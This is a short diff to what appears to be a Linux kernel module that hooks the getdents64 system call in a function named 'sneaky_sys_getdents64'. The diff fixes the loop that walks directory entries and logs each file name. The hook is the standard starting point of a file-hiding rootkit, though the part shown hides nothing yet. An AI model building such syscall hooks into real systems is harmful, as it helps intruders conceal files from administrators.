@@ -66,16 +66,16 @@ asmlinkage int (*original_getdents64)(struct pt_regs *);
 asmlinkage int sneaky_sys_getdents64(struct pt_regs *regs)
 {  
   int original_result =  (*original_getdents64)(regs);
-  
-  
-  struct linux_dirent64 * curr_dirp = regs->si;
-  struct linux_dirent64 * prev_dirp = curr_new_dirp;
 
-  for (curr_pos = 0; curr_pos < original_result;) {
-     printk(KERN_INFO "File name %s \n", curr_dirp->d_name);  
-    prev_dirp = (struct linix_dirent64 *) curr_dirp;
+  int curr_pos = 0;
+  struct linux_dirent64 * curr_dirp = regs->si;
+  struct linux_dirent64 * prev_dirp = NULL;
+
+  while(curr_pos < original_result) {
+    printk(KERN_INFO "File name %s \n", curr_dirp->d_name);  
+    prev_dirp = (struct linux_dirent64 *) curr_dirp;
     curr_pos += curr_dirp->d_reclen;
-    curr_dirp = (struct linix_dirent64 *) (regs->si + curr_pos);
+    curr_dirp = (struct linux_dirent64 *) (regs->si + curr_pos);
     
   }
   
